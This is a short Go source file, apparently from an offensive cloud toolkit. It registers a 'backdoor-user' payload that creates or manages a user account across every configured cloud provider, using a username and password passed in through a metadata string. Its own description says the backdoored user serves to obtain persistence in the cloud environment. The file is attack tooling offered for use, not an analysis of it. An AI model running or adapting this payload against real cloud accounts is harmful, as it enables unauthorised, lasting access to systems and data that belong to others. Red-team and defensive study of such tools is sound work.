package payloads

import (
	"log"
	"strings"

	"github.com/404tk/cloudtoolkit/pkg/inventory"
	"github.com/404tk/cloudtoolkit/pkg/schema"
)

type BackdoorUser struct{}

func (p BackdoorUser) Run(config map[string]string) {
	inventory, err := inventory.New(schema.Options{config})
	if err != nil {
		log.Println(err)
		return
	}
	var action, uname, pwd string
	if metadata, ok := config["metadata"]; ok {
		data := strings.Split(metadata, " ")
		if len(data) >= 2 {
			action = data[0]
			uname = data[1]
			if len(data) >= 3 {
				pwd = data[2]
			}
		}
	}

	for _, provider := range inventory.Providers {
		provider.UserManagement(action, uname, pwd)
	}
	// log.Println("[+] Done.")
}

func (p BackdoorUser) Desc() string {
	return "Backdoored user can be used to obtain persistence in the Cloud environment."
}

func init() {
	registerPayload("backdoor-user", BackdoorUser{})
}
